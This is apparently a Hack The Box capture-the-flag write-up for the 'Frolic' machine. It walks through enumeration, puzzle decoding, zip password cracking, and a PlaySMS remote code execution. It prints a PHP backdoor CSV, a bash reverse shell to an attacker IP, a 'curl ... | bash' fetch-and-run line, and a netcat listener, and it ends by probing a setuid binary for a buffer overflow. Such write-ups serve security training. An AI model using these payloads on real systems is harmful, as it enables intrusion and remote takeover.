## ------------->> Frolic <<-------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.111 -p-
-------

    Nmap scan report for 10.10.10.111
    Host is up (0.30s latency).
    Not shown: 65526 closed ports
    PORT      STATE    SERVICE     VERSION
    22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
    |   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
    |_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
    65/tcp    filtered tacacs-ds
    139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    1880/tcp  open     http        Node.js (Express middleware)
    |_http-title: Node-RED
    9999/tcp  open     http        nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: Welcome to nginx!
    30887/tcp filtered unknown
    56527/tcp filtered unknown
    57344/tcp filtered unknown
    Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: frolic
    |   NetBIOS computer name: FROLIC\x00
    |   Domain name: \x00
    |   FQDN: frolic
    |_  System time: 2021-08-11T19:45:26+05:30
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-08-11T14:15:26
    |_  start_date: N/A


// We can see SMB service , Lets try if we can connect anonymously

    $ smbmap -H 10.10.10.111
------

    [+] Guest session   	IP: 10.10.10.111:445	Name: 10.10.10.111                                      
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      print$                                            	NO ACCESS	Printer Drivers
      IPC$                                              	NO ACCESS	IPC Service (frolic server (Samba, Ubuntu))
-------

    $ smbclient -N -L ////10.10.10.111//
------

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
    SMB1 disabled -- no workgroup available


// Didnt give much, move on. 

// We can see ports 1880 and 9999 open with http services, lets see that

// Navigate to http://10.10.10.111:1880/

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/1.png)

// Navigate to http://10.10.10.111:9999

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/2.png)

// So, we got a Node-RED login page and nginX welcome page

// Lets search for some directories or files there with [dirsearch](https://github.com/maurosoria/dirsearch)(By Maurosoria)

    $ python3 dirsearch.py -u http://10.10.10.111:9999/ -t 150
-------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 10903

    Target: http://10.10.10.111:9999/

    [14:45:13] Starting: 
    [14:45:32] 301 -  194B  - /admin  ->  http://10.10.10.111:9999/admin/
    [14:45:32] 200 -  634B  - /admin/
    [14:45:32] 403 -  580B  - /admin/.htaccess
    [14:45:32] 200 -  634B  - /admin/?/login
    [14:45:33] 200 -  634B  - /admin/index.html
    [14:45:39] 403 -  580B  - /administrator/.htaccess
    [14:45:41] 403 -  580B  - /app/.htaccess
    [14:45:43] 301 -  194B  - /backup  ->  http://10.10.10.111:9999/backup/
    [14:45:43] 200 -   28B  - /backup/
    [14:45:50] 403 -  580B  - /dev/
    [14:45:50] 301 -  194B  - /dev  ->  http://10.10.10.111:9999/dev/
    [14:46:23] 301 -  194B  - /test  ->  http://10.10.10.111:9999/test/
    [14:46:23] 200 -   82KB - /test/

// We found /admin /backup /test /dev 

// Navigate to http://10.10.10.111:9999/backup/ , we can see 3 files

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/3.png)

// Navigate to http://10.10.10.111:9999/backup/password.txt

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/4.png)

// Navigate to http://10.10.10.111:9999/backup/user.txt

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/5.png)

// Navigate to http://10.10.10.111:9999/backup/loop/ , (Forbidden)

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/6.png)

------
// Navigate to http://10.10.10.111:9999/test/ , showing us 'phpinfo()' output

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/7.png)

------
// Navigate to http://10.10.10.111:9999/dev/ , (Forbidden)

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/8.png)

// Searching for more directories and files in http://10.10.10.111:9999/dev/

    $ python3 dirsearch.py -u http://10.10.10.111:9999/dev/ -t 150
------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 10903

    Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.10.111/dev_21-08-11_15-00-07.txt

    Error Log: /home/kali/Desktop/Tools/dirsearch/logs/errors-21-08-11_15-00-07.log

    Target: http://10.10.10.111:9999/dev/

    [15:00:07] Starting: 
    [15:00:37] 301 -  194B  - /dev/backup  ->  http://10.10.10.111:9999/dev/backup/
    [15:00:37] 200 -   11B  - /dev/backup/
    [15:01:07] 200 -    5B  - /dev/test

// found http://10.10.10.111:9999/dev/backup/ , Navigate to that directory

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/9.png)

// Navigate to http://10.10.10.111:9999/playsms , we see a PlaySMS application login page

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/10.png)

------
// Navigate to http://10.10.10.111:9999/admin/ , we see a 'hackable' login

![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/11.png)

// Checking on the source code we can see a mention of login.js file

![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/12.png)

// Navigate to that page we can see admin credentials !

// And we can see that after success login , the page redirects you to 'success.html'

![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/13.png)

    admin : superduperlooperpassword_lol

// After login we get the 'success.html' page

![Image 14](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/14.png)

// After some search , what we see its called [Ook!](https://esolangs.org/wiki/ook!) Programming language(Similar to BrainFuck)

// We can decode that [here](https://www.dcode.fr/ook-language)

![Image 15](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/15.png)

    Nothing here check /asdiSIAJJ0QWE9JAS

// Navigating to http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ , we see and encrypted string

![Image 16](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/16.png)

// Checking the file of the string in [Cyberchef](https://gchq.github.io/) , Resulting me that its a base64 decoded zip file

![Image 17](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/17.png)

// So i first save the string to file called 'sstring'

    $ nano string

// Then decode Base64 and save to file called 'string.dec'

    $ cat string | base64 -d > string.dec

// Now save the file as zip file

    $ mv string.dec string.dec.zip

// When try to unzip that file he require a password

    $ unzip string.dec.zip
    Archive:  string.dec.zip
    [string.dec.zip] index.php password: 

// We can easily crack that password with list rockyou.txt and [Fcrackzip](https://github.com/hyc/fcrackzip) Tool.

    $ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt string.dec.zip 

    PASSWORD FOUND!!!!: pw == password

// we extract file called 'index.php' , when see the contant we have another string

// We can Decode that again in [Cyberchef](https://gchq.github.io/) (Recipe: From Hex >> From Base64)

![Image 18](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/18.png)

// Then we get something that looks like BrainFuck Proggraming language

// Lets try to Decode that in another [online decoder exellent tool](https://www.dcode.fr/brainfuck-language)

![Image 19](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/19.png)

    idkwhatispass

// Now we can login to http://10.10.10.111:9999/playsms/ with: 

    admin : idkwhatispass

// Searhing in ExploitDB , found [Remote Code Execution Vulnerability](https://www.exploit-db.com/exploits/42044)

// Following the exploit , Make a .csv file with php code 

    $ cat backdoor.csv 
    <?php echo exec('whoami'); ?>,1

// Navigate to 'My Account' >> 'Send from file'

![Image 20](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/20.png)

// Upload the file and its work !

![Image 21](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Frolic/21.png)

// Now we can make a reverse shell

    $ cat revshell 
    bash -i >& /dev/tcp/10.10.16.232/1444 0>&1

// We will upload the shell with python http server 

    $ python3 -m http.server 1445
    Serving HTTP on 0.0.0.0 port 1445 (http://0.0.0.0:1445/) ...

// The upload file

    $ cat backdoor2.csv
    <?php echo exec('curl http://10.10.16.232:1445/revshell | bash'); ?>,1

// Open a listiner with nc on port 1444 and upload backdoor2.csv file

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.232] from (UNKNOWN) [10.10.10.111] 45400
    bash: cannot set terminal process group (1227): Inappropriate ioctl for device
    bash: no job control in this shell

    www-data@frolic:~/html/playsms$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

// We got a shell !! And user flag !

    www-data@frolic:/home/ayush$ cat user.txt
    2ab95909cf509f85a6f476b59a0c2fe0


### -----Privilleges Escalation------

// After some search for some interesting files i found hidden directory at ayush user called '.binary'

// Inside the folder was a executable file called rop

    www-data@frolic:/home/ayush/.binary$ file rop
    rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped

// Launch this file output:

    www-data@frolic:/home/ayush/.binary$ rop
    [*] Usage: program <message>

// Its seems that its request to input some massage

// Lets try to check if its vulnerable to [Buffer Overflow Attack](https://www.veracode.com/security/buffer-overflow)(Segmentation fault)

    www-data@frolic:/home/ayush/.binary$ rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                    
    [+] Message sent: rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    www-data@frolic:/home/ayush/.binary$ rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                
    [+] Message sent: rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    www-data@frolic:/home/ayush/.binary$ rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa               
    [+] Message sent: rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    www-data@frolic:/home/ayush/.binary$ rop aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    bash: [1638: 2 (255)] tcsetattr: Inappropriate ioctl for device

// After some checks we can see that this file is vulnerable to [Buffer Overflow](https://www.veracode.com/security/buffer-overflow)
    
    
    
    
